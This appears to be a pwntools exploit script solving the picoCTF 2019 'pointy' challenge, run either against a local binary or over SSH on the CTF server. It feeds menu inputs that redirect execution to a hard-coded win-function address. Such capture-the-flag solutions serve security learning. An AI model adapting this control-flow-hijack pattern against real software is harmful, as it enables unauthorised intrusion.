from pwn import *
import sys

argv = sys.argv

DEBUG = False
# BINARY = './vuln'
BINARY = '/problems/pointy_1_e2b49b679521bd6d957b864c91e7b39e/vuln'

context.binary = BINARY
# context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/pointy_1_e2b49b679521bd6d957b864c91e7b39e')
  REMOTE = True

win_addr = 0x08048696

payload = ''

send = lambda x: sh.sendlineafter('\n', x)

send('a')
# sh.recv()
send('b')
send('a')
send('b')
send(str(win_addr))

sh.sendlineafter(' student\n', 'c')
send('d')
send('b')
send('d')
send(str(0))

sh.interactive()  